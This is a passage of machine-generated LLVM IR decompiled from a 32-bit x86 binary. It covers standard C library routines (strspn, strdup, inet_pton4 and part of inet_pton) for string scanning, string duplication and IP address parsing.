  %v1_8053682 = icmp eq i1 %v16_805367f, false
  br i1 %v1_8053682, label %dec_label_pc_805364c, label %dec_label_pc_8053684

dec_label_pc_8053684:                             ; preds = %dec_label_pc_8053630, %dec_label_pc_805367c, %dec_label_pc_8053674, %dec_label_pc_805366c, %dec_label_pc_8053664
  %v0_8053686 = phi i32 [ %v1_805367c, %dec_label_pc_805367c ], [ %v1_8053674, %dec_label_pc_8053674 ], [ %v1_805366c, %dec_label_pc_805366c ], [ %v0_8053650, %dec_label_pc_8053664 ], [ %v0_8053634, %dec_label_pc_8053630 ]
  store i32 %v0_8053625, i32* @ebx, align 4
  ret i32 %v0_8053686

; uselistorder directives
  uselistorder i32 %v1_8053659, { 1, 0 }
  uselistorder i32 %v1_8053650, { 2, 1, 0 }
  uselistorder i32 %v2_8053643, { 1, 0 }
  uselistorder i32 %v1_8053634, { 1, 0, 2 }
  uselistorder i32 %v4_805362a, { 2, 1, 0 }
  uselistorder i32 %v4_8053626, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8053684, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8053639, { 1, 0 }
  uselistorder label %dec_label_pc_8053630, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_80536aa30 = load i8, i8* %arg1, align 1
  %v4_80536ac34 = icmp eq i8 %v2_80536aa30, 0
  br i1 %v4_80536ac34, label %dec_label_pc_80536b4, label %dec_label_pc_80536b0.lr.ph

dec_label_pc_80536b0.lr.ph:                       ; preds = %entry
  %v3_80536aa31 = zext i8 %v2_80536aa30 to i32
  %v4_80536aa.pre = load i32, i32* @eax, align 4
  %v5_80536aa32 = and i32 %v4_80536aa.pre, -256
  %v6_80536aa33 = or i32 %v3_80536aa31, %v5_80536aa32
  %v4_8053691 = ptrtoint i8* %arg1 to i32
  %v1_805369c18 = inttoptr i32 %arg2 to i8*
  %v4_805369c.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80536b0

dec_label_pc_8053697:                             ; preds = %dec_label_pc_80536b0, %dec_label_pc_805369b
  %v6_805369c27 = phi i32 [ %v6_805369c, %dec_label_pc_805369b ], [ %v6_805369c22, %dec_label_pc_80536b0 ]
  %v2_805369c26 = phi i8 [ %v2_805369c, %dec_label_pc_805369b ], [ %v2_805369c19, %dec_label_pc_80536b0 ]
  %v0_805369b25 = phi i32 [ %v1_805369b, %dec_label_pc_805369b ], [ %arg2, %dec_label_pc_80536b0 ]
  %v15_8053697 = icmp eq i8 %v2_80536aa37, %v2_805369c26
  br i1 %v15_8053697, label %dec_label_pc_80536a4, label %dec_label_pc_805369b

dec_label_pc_805369b:                             ; preds = %dec_label_pc_8053697
  %v1_805369b = add i32 %v0_805369b25, 1
  store i32 %v1_805369b, i32* @edx, align 4
  %v1_805369c = inttoptr i32 %v1_805369b to i8*
  %v2_805369c = load i8, i8* %v1_805369c, align 1
  %v3_805369c = zext i8 %v2_805369c to i32
  %v5_805369c = and i32 %v6_805369c27, -256
  %v6_805369c = or i32 %v3_805369c, %v5_805369c
  store i32 %v6_805369c, i32* @ecx, align 4
  %v4_805369e = icmp eq i8 %v2_805369c, 0
  %v1_80536a0 = icmp eq i1 %v4_805369e, false
  br i1 %v1_80536a0, label %dec_label_pc_8053697, label %dec_label_pc_80536b4

dec_label_pc_80536a4:                             ; preds = %dec_label_pc_8053697
  %v1_80536a8 = add i32 %v0_80536b435, 1
  %v1_80536a9 = add i32 %v0_80536a936, 1
  %v1_80536aa = inttoptr i32 %v1_80536a9 to i8*
  %v2_80536aa = load i8, i8* %v1_80536aa, align 1
  %v3_80536aa = zext i8 %v2_80536aa to i32
  %v5_80536aa = and i32 %v6_80536aa38, -256
  %v6_80536aa = or i32 %v3_80536aa, %v5_80536aa
  %v4_80536ac = icmp eq i8 %v2_80536aa, 0
  br i1 %v4_80536ac, label %dec_label_pc_80536b4, label %dec_label_pc_80536b0

dec_label_pc_80536b0:                             ; preds = %dec_label_pc_80536b0.lr.ph, %dec_label_pc_80536a4
  %v4_805369c.pre = phi i32 [ %v4_805369c.pre.pre, %dec_label_pc_80536b0.lr.ph ], [ %v6_805369c27, %dec_label_pc_80536a4 ]
  %v6_80536aa38 = phi i32 [ %v6_80536aa33, %dec_label_pc_80536b0.lr.ph ], [ %v6_80536aa, %dec_label_pc_80536a4 ]
  %v2_80536aa37 = phi i8 [ %v2_80536aa30, %dec_label_pc_80536b0.lr.ph ], [ %v2_80536aa, %dec_label_pc_80536a4 ]
  %v0_80536a936 = phi i32 [ %v4_8053691, %dec_label_pc_80536b0.lr.ph ], [ %v1_80536a9, %dec_label_pc_80536a4 ]
  %v0_80536b435 = phi i32 [ 0, %dec_label_pc_80536b0.lr.ph ], [ %v1_80536a8, %dec_label_pc_80536a4 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_805369c19 = load i8, i8* %v1_805369c18, align 1
  %v3_805369c20 = zext i8 %v2_805369c19 to i32
  %v5_805369c21 = and i32 %v4_805369c.pre, -256
  %v6_805369c22 = or i32 %v3_805369c20, %v5_805369c21
  store i32 %v6_805369c22, i32* @ecx, align 4
  %v4_805369e23 = icmp eq i8 %v2_805369c19, 0
  %v1_80536a024 = icmp eq i1 %v4_805369e23, false
  br i1 %v1_80536a024, label %dec_label_pc_8053697, label %dec_label_pc_80536b4

dec_label_pc_80536b4:                             ; preds = %entry, %dec_label_pc_80536a4, %dec_label_pc_80536b0, %dec_label_pc_805369b
  %v0_80536b417 = phi i32 [ %v0_80536b435, %dec_label_pc_805369b ], [ %v0_80536b435, %dec_label_pc_80536b0 ], [ 0, %entry ], [ %v1_80536a8, %dec_label_pc_80536a4 ]
  ret i32 %v0_80536b417

; uselistorder directives
  uselistorder i32 %v6_805369c22, { 1, 0 }
  uselistorder i8 %v2_805369c19, { 1, 2, 0 }
  uselistorder i32 %v1_80536a9, { 1, 0 }
  uselistorder i32 %v6_805369c, { 1, 0 }
  uselistorder i8 %v2_805369c, { 1, 2, 0 }
  uselistorder i32 %v1_805369b, { 2, 1, 0 }
  uselistorder i8 %v2_80536aa30, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80536b4, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_80536b0, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80536bc = load i32, i32* @edi, align 4
  %v0_80536bd = load i32, i32* @esi, align 4
  %v0_80536be = load i32, i32* @ebx, align 4
  store i32 %v0_80536be, i32* %stack_var_-12, align 4
  %v4_80536bf = ptrtoint i8* %arg1 to i32
  store i32 %v4_80536bf, i32* @edi, align 4
  %v3_80536c7 = call i32 @strlen(i8* %arg1)
  %v1_80536cc = add i32 %v3_80536c7, 1
  store i32 %v1_80536cc, i32* @esi, align 4
  %v2_80536d2 = call i32 @malloc(i32 %v1_80536cc)
  store i32 %v2_80536d2, i32* %ebx.global-to-local, align 4
  %v1_80536dc = icmp eq i32 %v2_80536d2, 0
  br i1 %v1_80536dc, label %dec_label_pc_80536ec, label %dec_label_pc_80536e0

dec_label_pc_80536e0:                             ; preds = %entry
  %v0_80536e1 = load i32, i32* @esi, align 4
  %v0_80536e2 = load i32, i32* @edi, align 4
  %tmp12 = inttoptr i32 %v2_80536d2 to i16*
  %v6_80536e4 = call i32 @memcpy(i16* %tmp12, i32 %v0_80536e2, i32 %v0_80536e1)
  %v0_80536ec.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80536ec

dec_label_pc_80536ec:                             ; preds = %entry, %dec_label_pc_80536e0
  %v0_80536ec = phi i32 [ 0, %entry ], [ %v0_80536ec.pre, %dec_label_pc_80536e0 ]
  %v2_80536ee = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80536ee, i32* @ebx, align 4
  store i32 %v0_80536bd, i32* @esi, align 4
  store i32 %v0_80536bc, i32* @edi, align 4
  ret i32 %v0_80536ec

; uselistorder directives
  uselistorder i32 %v2_80536d2, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 9, 8, 7, 17, 16, 15, 2, 4, 0, 14, 13, 12, 11, 10, 6, 5, 3, 1 }
  uselistorder label %dec_label_pc_80536ec, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_80536f6 = load i32, i32* @esi, align 4
  %v0_80536fd = load i32, i32* @eax, align 4
  store i32 %v0_80536fd, i32* %ebx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  store i32 0, i32* @edi, align 4
  %v2_8053703 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8053703, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_805374b15 = inttoptr i32 %v0_80536fd to i8*
  %v2_805374b16 = load i8, i8* %v1_805374b15, align 1
  %v3_805374b17 = sext i8 %v2_805374b16 to i32
  store i32 %v3_805374b17, i32* @ecx, align 4
  %v1_805374e18 = add i32 %v0_80536fd, 1
  store i32 %v1_805374e18, i32* %ebx.global-to-local, align 4
  %v1_805374f19 = icmp eq i8 %v2_805374b16, 0
  %v1_805375120 = icmp eq i1 %v1_805374f19, false
  br i1 %v1_805375120, label %dec_label_pc_805370e, label %dec_label_pc_8053753.thread

dec_label_pc_8053753.thread:                      ; preds = %entry
  br label %dec_label_pc_8053770

dec_label_pc_805370e:                             ; preds = %entry, %dec_label_pc_805374b.backedge
  %v3_805374b22 = phi i32 [ %v3_805374b, %dec_label_pc_805374b.backedge ], [ %v3_805374b17, %entry ]
  %v2_805374b21 = phi i8 [ %v2_805374b, %dec_label_pc_805374b.backedge ], [ %v2_805374b16, %entry ]
  %v1_805370e = add nsw i32 %v3_805374b22, -48
  store i32 %v1_805370e, i32* %eax.global-to-local, align 4
  %v6_8053714 = icmp ugt i32 %v1_805370e, 9
  br i1 %v6_8053714, label %dec_label_pc_8053737, label %dec_label_pc_8053716

dec_label_pc_8053716:                             ; preds = %dec_label_pc_805370e
  %v0_8053716 = load i32, i32* @esi, align 4
  %v1_8053716 = inttoptr i32 %v0_8053716 to i8*
  %v2_8053716 = load i8, i8* %v1_8053716, align 1
  %v2_8053719 = zext i8 %v2_8053716 to i32
  %v3_8053719 = mul nuw nsw i32 %v2_8053719, 10
  %v3_805371c = add nsw i32 %v3_8053719, %v1_805370e
  store i32 %v3_805371c, i32* %eax.global-to-local, align 4
  %v6_8053725 = icmp ugt i32 %v3_805371c, 255
  br i1 %v6_8053725, label %dec_label_pc_8053770, label %dec_label_pc_8053727

dec_label_pc_8053727:                             ; preds = %dec_label_pc_8053716
  %v1_8053727 = trunc i32 %v3_805371c to i8
  store i8 %v1_8053727, i8* %v1_8053716, align 1
  %v0_8053729 = load i32, i32* @edx, align 4
  %v1_8053729 = icmp eq i32 %v0_8053729, 0
  %v1_805372b = icmp eq i1 %v1_8053729, false
  br i1 %v1_805372b, label %dec_label_pc_805374b.backedge, label %dec_label_pc_805372d

dec_label_pc_805372d:                             ; preds = %dec_label_pc_8053727
  %v0_805372d = load i32, i32* @edi, align 4
  %v1_805372d = add i32 %v0_805372d, 1
  store i32 %v1_805372d, i32* @edi, align 4
  %v1_805372e = add i32 %v0_805372d, -3
  %v6_805372e = sub i32 2, %v0_805372d
  %v7_805372e = and i32 %v6_805372e, %v1_805372d
  %v8_805372e = icmp slt i32 %v7_805372e, 0
  %v9_805372e = icmp eq i32 %v1_805372e, 0
  %v10_805372e = icmp slt i32 %v1_805372e, 0
  %v3_8053731 = icmp eq i1 %v10_805372e, %v8_805372e
  %v4_8053731 = icmp eq i1 %v9_805372e, false
  %v5_8053731 = and i1 %v4_8053731, %v3_8053731
  br i1 %v5_8053731, label %dec_label_pc_8053770, label %dec_label_pc_8053733

dec_label_pc_8053733:                             ; preds = %dec_label_pc_805372d
  %v1_8053733 = and i32 %v0_8053729, -256
  %v2_8053733 = or i32 %v1_8053733, 1
  store i32 %v2_8053733, i32* @edx, align 4
  br label %dec_label_pc_805374b.backedge

dec_label_pc_8053737:                             ; preds = %dec_label_pc_805370e
  %v9_8053737 = icmp eq i8 %v2_805374b21, 46
  %v1_805373a = icmp eq i1 %v9_8053737, false
  br i1 %v1_805373a, label %dec_label_pc_8053770, label %dec_label_pc_805373c

dec_label_pc_805373c:                             ; preds = %dec_label_pc_8053737
  %v0_805373c = load i32, i32* @edx, align 4
  %v1_805373c = icmp eq i32 %v0_805373c, 0
  br i1 %v1_805373c, label %dec_label_pc_8053770, label %dec_label_pc_8053740

dec_label_pc_8053740:                             ; preds = %dec_label_pc_805373c
  %v0_8053740 = load i32, i32* @edi, align 4
  %v9_8053740 = icmp eq i32 %v0_8053740, 4
  br i1 %v9_8053740, label %dec_label_pc_8053770, label %dec_label_pc_8053745

dec_label_pc_8053745:                             ; preds = %dec_label_pc_8053740
  %v0_8053745 = load i32, i32* @esi, align 4
  %v1_8053745 = add i32 %v0_8053745, 1
  store i32 %v1_8053745, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v1_8053748 = inttoptr i32 %v1_8053745 to i8*
  store i8 0, i8* %v1_8053748, align 1
  br label %dec_label_pc_805374b.backedge

dec_label_pc_805374b.backedge:                    ; preds = %dec_label_pc_8053745, %dec_label_pc_8053733, %dec_label_pc_8053727
  %v0_805374b.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805374b = inttoptr i32 %v0_805374b.pre to i8*
  %v2_805374b = load i8, i8* %v1_805374b, align 1
  %v3_805374b = sext i8 %v2_805374b to i32
  store i32 %v3_805374b, i32* @ecx, align 4
  %v1_805374e = add i32 %v0_805374b.pre, 1
  store i32 %v1_805374e, i32* %ebx.global-to-local, align 4
  %v1_805374f = icmp eq i8 %v2_805374b, 0
  %v1_8053751 = icmp eq i1 %v1_805374f, false
  br i1 %v1_8053751, label %dec_label_pc_805370e, label %dec_label_pc_8053753

dec_label_pc_8053753:                             ; preds = %dec_label_pc_805374b.backedge
  %v0_8053753.pre = load i32, i32* @edi, align 4
  %v7_8053756 = icmp sgt i32 %v0_8053753.pre, 3
  br i1 %v7_8053756, label %dec_label_pc_8053758, label %dec_label_pc_8053770

dec_label_pc_8053758:                             ; preds = %dec_label_pc_8053753
  %v0_8053758 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_8053703, i32* %eax.global-to-local, align 4
  %v3_8053761 = bitcast i32* %stack_var_-20 to i16*
  %v4_8053761 = call i32 @memcpy(i16* %v3_8053761, i32 4, i32 %v0_8053758)
  br label %dec_label_pc_8053772

dec_label_pc_8053770:                             ; preds = %dec_label_pc_8053740, %dec_label_pc_805373c, %dec_label_pc_8053737, %dec_label_pc_805372d, %dec_label_pc_8053716, %dec_label_pc_8053753.thread, %dec_label_pc_8053753
  br label %dec_label_pc_8053772

dec_label_pc_8053772:                             ; preds = %dec_label_pc_8053758, %dec_label_pc_8053770
  %storemerge = phi i32 [ 0, %dec_label_pc_8053770 ], [ 1, %dec_label_pc_8053758 ]
  %v0_8053779 = phi i32 [ 0, %dec_label_pc_8053770 ], [ 1, %dec_label_pc_8053758 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80536f6, i32* @esi, align 4
  ret i32 %v0_8053779

; uselistorder directives
  uselistorder i32 %v3_805374b, { 1, 0 }
  uselistorder i8 %v2_805374b, { 1, 2, 0 }
  uselistorder i32 %v1_805372e, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 255, { 2, 1, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8053772, { 1, 0 }
  uselistorder label %dec_label_pc_8053770, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_805370e, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_805377a = load i32, i32* @ebp, align 4
  %v0_805377b = load i32, i32* @edi, align 4
  %v0_805377c = load i32, i32* @esi, align 4
  %v0_805377d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_8053785 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8053785, i32* @edi, align 4
  %v9_8053789 = icmp eq i32 %arg1, 2
  br i1 %v9_8053789, label %dec_label_pc_8053799, label %dec_label_pc_805378e

dec_label_pc_805378e:                             ; preds = %entry
  %v9_805378e = icmp eq i32 %arg1, 10
  %v1_8053791 = icmp eq i1 %v9_805378e, false
  br i1 %v1_8053791, label %dec_label_pc_805392a, label %dec_label_pc_80537a9

dec_label_pc_8053799:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_8053785, i32* @eax, align 4
  %v3_805379f = call i32 @inet_pton4(i32 %v0_805377d, i32 %v0_805377c, i32 %v0_805377b)
  store i32 %v3_805379f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805393c

dec_label_pc_80537a9:                             ; preds = %dec_label_pc_805378e
  %v2_80537ae = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80537ae, i32* %eax.global-to-local, align 4
  %tmp61 = bitcast i32* %stack_var_-32 to i8*
  %v5_80537b3 = call i32 @__GI_memset(i8* %tmp61, i32 0, i32 16)
  store i32 %v5_80537b3, i32* @ebx, align 4
  %v2_80537ba = add i32 %v5_80537b3, 16
  store i32 %v2_80537ba, i32* %eax.global-to-local, align 4
  %v0_80537c4 = load i32, i32* @edi, align 4
  %v1_80537c4 = inttoptr i32 %v0_80537c4 to i8*
  %v2_80537c4 = load i8, i8* %v1_80537c4, align 1
  %v11_80537c4 = icmp eq i8 %v2_80537c4, 58
  %v1_80537c7 = icmp eq i1 %v11_80537c4, false
  br i1 %v1_80537c7, label %dec_label_pc_805385a, label %dec_label_pc_80537c9

dec_label_pc_80537c9:                             ; preds = %dec_label_pc_80537a9
  %v1_80537c9 = add i32 %v0_80537c4, 1
  store i32 %v1_80537c9, i32* @edi, align 4
  %v1_80537ca = inttoptr i32 %v1_80537c9 to i8*
  %v2_80537ca = load i8, i8* %v1_80537ca, align 1
  %v11_80537ca = icmp eq i8 %v2_80537ca, 58
  %v1_80537cd = icmp eq i1 %v11_80537ca, false
  br i1 %v1_80537cd, label %dec_label_pc_805393a, label %dec_label_pc_805385a

dec_label_pc_80537e1:                             ; preds = %dec_label_pc_805389a
  %v4_80537e9 = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_80580b4.292, i32 0, i32 0), i32 %v2_80538a1)
  store i32 %v4_80537e9, i32* %eax.global-to-local, align 4
  %v0_80537ee = load i32, i32* @edi, align 4
  %v1_80537ee = add i32 %v0_80537ee, 1
  store i32 %v1_80537ee, i32* @edi, align 4
  %v1_80537f2 = icmp eq i32 %v4_80537e9, 0
  br i1 %v1_80537f2, label %dec_label_pc_8053811, label %dec_label_pc_80537f6

dec_label_pc_80537f6:                             ; preds = %dec_label_pc_80537e1
  %v0_80537f6 = load i32, i32* @ebp, align 4
  %v2_80537f6 = mul i32 %v0_80537f6, 16
  %v1_80537f9 = add i32 %v4_80537e9, -134578356
  store i32 %v1_80537f9, i32* %eax.global-to-local, align 4
  %v2_80537fe = or i32 %v2_80537f6, %v1_80537f9
  store i32 %v2_80537fe, i32* @ebp, align 4
  %tmp127 = icmp ult i32 %v2_80537fe, 65536
  br i1 %tmp127, label %dec_label_pc_805389a.outer, label %dec_label_pc_805393a

dec_label_pc_805389a.outer:                       ; preds = %dec_label_pc_80537f6, %dec_label_pc_805385a
  %v0_805389d37 = phi i32 [ %v1_80537ee, %dec_label_pc_80537f6 ], [ %stack_var_-36.0.in, %dec_label_pc_805385a ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_80537f6 ], [ %stack_var_-44.0, %dec_label_pc_805385a ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_80537f6 ], [ %stack_var_-36.0, %dec_label_pc_805385a ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_80537f6 ], [ 0, %dec_label_pc_805385a ]
  %v4_8053816 = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_805381b = icmp eq i1 %v4_8053816, false
  br label %dec_label_pc_805389a

dec_label_pc_8053811:                             ; preds = %dec_label_pc_80537e1
  %v0_8053811 = load i32, i32* @esi, align 4
  %v9_8053811 = icmp eq i32 %v0_8053811, 58
  %v1_8053814 = icmp eq i1 %v9_8053811, false
  br i1 %v1_8053814, label %dec_label_pc_8053866, label %dec_label_pc_8053816

dec_label_pc_8053816:                             ; preds = %dec_label_pc_8053811
  br i1 %v1_805381b, label %dec_label_pc_8053832, label %dec_label_pc_805381d

dec_label_pc_805381d:                             ; preds = %dec_label_pc_8053816
  %v5_805381d = icmp eq i8* %stack_var_-44.1, null
  %v1_8053822 = icmp eq i1 %v5_805381d, false
  br i1 %v1_8053822, label %dec_label_pc_805393a, label %dec_label_pc_8053828

dec_label_pc_8053828:                             ; preds = %dec_label_pc_805381d
  %v0_8053828 = load i32, i32* @ebx, align 4
  %v5_8053828 = inttoptr i32 %v0_8053828 to i8*
  %v5_805382c = inttoptr i32 %v1_80537ee to i8*
  br label %dec_label_pc_805389a

dec_label_pc_8053832:                             ; preds = %dec_label_pc_8053816
  %v1_8053832 = inttoptr i32 %v1_80537ee to i8*
  %v2_8053832 = load i8, i8* %v1_8053832, align 1
  %v3_8053832 = icmp eq i8 %v2_8053832, 0
  br i1 %v3_8053832, label %dec_label_pc_805393a, label %dec_label_pc_805383b

dec_label_pc_805383b:                             ; preds = %dec_label_pc_8053832
  %v0_805383b = load i32, i32* @ebx, align 4
  %v1_805383b = add i32 %v0_805383b, 2
  store i32 %v1_805383b, i32* @edx, align 4
  %v6_8053842 = icmp ugt i32 %v1_805383b, %v2_80537ba
  br i1 %v6_8053842, label %dec_label_pc_805393a, label %dec_label_pc_8053848

dec_label_pc_8053848:                             ; preds = %dec_label_pc_805383b
  %v0_8053848 = load i32, i32* @ebp, align 4
  %v2_805384a = udiv i32 %v0_8053848, 256
  %v4_805384a = trunc i32 %v2_805384a to i8
  %v3_805384d = inttoptr i32 %v0_805383b to i8*
  store i8 %v4_805384a, i8* %v3_805384d, align 1
  %v0_805384f = load i32, i32* @ebp, align 4
  store i32 %v0_805384f, i32* %eax.global-to-local, align 4
  %v1_8053851 = trunc i32 %v0_805384f to i8
  %v2_8053851 = load i32, i32* @ebx, align 4
  %v3_8053851 = add i32 %v2_8053851, 1
  %v4_8053851 = inttoptr i32 %v3_8053851 to i8*
  store i8 %v1_8053851, i8* %v4_8053851, align 1
  %v0_8053854 = load i32, i32* @edx, align 4
  store i32 %v0_8053854, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805385a

dec_label_pc_805385a:                             ; preds = %dec_label_pc_80537a9, %dec_label_pc_80537c9, %dec_label_pc_8053848
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_8053848 ], [ %v1_80537c9, %dec_label_pc_80537c9 ], [ %v0_80537c4, %dec_label_pc_80537a9 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_8053848 ], [ null, %dec_label_pc_80537c9 ], [ null, %dec_label_pc_80537a9 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805389a.outer

dec_label_pc_8053866:                             ; preds = %dec_label_pc_8053811
  %v9_8053866 = icmp eq i32 %v0_8053811, 46
  %v1_8053869 = icmp eq i1 %v9_8053866, false
  br i1 %v1_8053869, label %dec_label_pc_805393a, label %dec_label_pc_805386f

dec_label_pc_805386f:                             ; preds = %dec_label_pc_8053866
  %v0_805386f = load i32, i32* @ebx, align 4
  %v1_805386f = add i32 %v0_805386f, 4
  store i32 %v1_805386f, i32* @esi, align 4
  %v6_8053876 = icmp ugt i32 %v1_805386f, %v2_80537ba
  br i1 %v6_8053876, label %dec_label_pc_805393a, label %dec_label_pc_805387c

dec_label_pc_805387c:                             ; preds = %dec_label_pc_805386f
  store i32 %v0_805386f, i32* @edx, align 4
  %v4_805387e = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_805387e, i32* @eax, align 4
  %v2_8053882 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8053882 = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_8053882, i32 %v2_80537ba)
  store i32 %v5_8053882, i32* %eax.global-to-local, align 4
  %v0_8053887 = load i32, i32* @esi, align 4
  %tmp62 = icmp slt i32 %v5_8053882, 1
  %tmp63 = icmp eq i1 %tmp62, false
  br i1 %tmp63, label %dec_label_pc_80538d1, label %dec_label_pc_805393a

dec_label_pc_805389a:                             ; preds = %dec_label_pc_805389a.outer, %dec_label_pc_8053828
  %v0_805389d = phi i32 [ %v1_80537ee, %dec_label_pc_8053828 ], [ %v0_805389d37, %dec_label_pc_805389a.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_8053828, %dec_label_pc_8053828 ], [ %stack_var_-44.1.ph, %dec_label_pc_805389a.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_805382c, %dec_label_pc_8053828 ], [ %stack_var_-36.1.ph, %dec_label_pc_805389a.outer ]
  %v1_805389d = inttoptr i32 %v0_805389d to i8*
  %v2_805389d = load i8, i8* %v1_805389d, align 1
  %v3_805389d = sext i8 %v2_805389d to i32
  store i32 %v3_805389d, i32* %eax.global-to-local, align 4
  %v2_80538a1 = call i32 @__GI_tolower(i32 %v3_805389d)
  store i32 %v2_80538a1, i32* %eax.global-to-local, align 4
  store i32 %v2_80538a1, i32* @esi, align 4
  %v1_80538ab = icmp eq i32 %v2_80538a1, 0
  %v1_80538ad = icmp eq i1 %v1_80538ab, false
  br i1 %v1_80538ad, label %dec_label_pc_80537e1, label %dec_label_pc_80538b3

dec_label_pc_80538b3:                             ; preds = %dec_label_pc_805389a
  %v0_8053909.pre.pre = load i32, i32* @ebx, align 4
  br i1 %v4_8053816, label %dec_label_pc_80538d1, label %dec_label_pc_80538ba

dec_label_pc_80538ba:                             ; preds = %dec_label_pc_80538b3
  %v1_80538ba = add i32 %v0_8053909.pre.pre, 2
  store i32 %v1_80538ba, i32* @edx, align 4
  %v6_80538c1 = icmp ugt i32 %v1_80538ba, %v2_80537ba
  br i1 %v6_80538c1, label %dec_label_pc_805393a, label %dec_label_pc_80538c3

dec_label_pc_80538c3:                             ; preds = %dec_label_pc_80538ba
  %v0_80538c3 = load i32, i32* @ebp, align 4
  %v2_80538c5 = udiv i32 %v0_80538c3, 256
  %v4_80538c5 = trunc i32 %v2_80538c5 to i8
  %v3_80538c8 = inttoptr i32 %v0_8053909.pre.pre to i8*
  store i8 %v4_80538c5, i8* %v3_80538c8, align 1
  %v0_80538ca = load i32, i32* @ebp, align 4
  store i32 %v0_80538ca, i32* %eax.global-to-local, align 4
  %v1_80538cc = trunc i32 %v0_80538ca to i8
  %v2_80538cc = load i32, i32* @ebx, align 4
  %v3_80538cc = add i32 %v2_80538cc, 1
  %v4_80538cc = inttoptr i32 %v3_80538cc to i8*
  store i8 %v1_80538cc, i8* %v4_80538cc, align 1
  %v0_80538cf = load i32, i32* @edx, align 4
  br label %dec_label_pc_80538d1

dec_label_pc_80538d1:                             ; preds = %dec_label_pc_80538b3, %dec_label_pc_805387c, %dec_label_pc_80538c3
  %v0_8053909.pre = phi i32 [ %v0_8053887, %dec_label_pc_805387c ], [ %v0_80538cf, %dec_label_pc_80538c3 ], [ %v0_8053909.pre.pre, %dec_label_pc_80538b3 ]
  %v4_80538d1 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_80538d1 = icmp eq i8* %stack_var_-44.1, null
  br i1 %v5_80538d1, label %dec_label_pc_8053909, label %dec_label_pc_80538d8

dec_label_pc_80538d8:                             ; preds = %dec_label_pc_80538d1
  store i32 1, i32* @esi, align 4
  %v6_80538df = sub i32 %v0_8053909.pre, %v4_80538d1
  store i32 %v6_80538df, i32* @edi, align 4
  %v16_80538e3 = icmp eq i32 %v0_8053909.pre, %v2_80537ba
  %v1_80538e7 = icmp eq i1 %v16_80538e3, false
  br i1 %v1_80538e7, label %dec_label_pc_8053901.preheader, label %dec_label_pc_805393a

dec_label_pc_8053901.preheader:                   ; preds = %dec_label_pc_80538d8
  %v3_805390195 = inttoptr i32 %v6_80538df to i8*
  %v9_805390398 = icmp slt i8* %v3_805390195, inttoptr (i32 1 to i8*)
  br i1 %v9_805390398, label %dec_label_pc_8053909.thread, label %dec_label_pc_80538eb

dec_label_pc_80538eb:                             ; preds = %dec_label_pc_8053901.preheader, %dec_label_pc_80538eb
  %v0_80538f9100 = phi i32 [ %v0_8053901.pre, %dec_label_pc_80538eb ], [ 1, %dec_label_pc_8053901.preheader ]
  %v0_80538eb99 = phi i32 [ %v1_8053901.pre, %dec_label_pc_80538eb ], [ %v6_80538df, %dec_label_pc_8053901.preheader ]
  %v2_80538f1 = sub i32 %v0_80538eb99, %v0_80538f9100
  %v2_80538f3 = sub i32 %v2_80537ba, %v0_80538f9100
